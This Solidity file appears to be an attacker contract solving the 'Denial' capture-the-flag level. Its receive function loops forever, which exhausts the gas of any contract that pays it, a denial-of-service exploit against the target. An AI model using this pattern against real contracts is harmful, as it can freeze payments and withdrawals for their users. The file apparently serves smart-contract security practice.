
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";
import {Denial} from "./Denial.sol";

contract DenialHacker {

  // address targetAddr;
  // uint256 gasUsed = 0;

  // constructor(address _targetAddr) {
  //   targetAddr = _targetAddr;
  // }

  receive() external payable {
    while (true) {}
  }

  fallback() external {}
}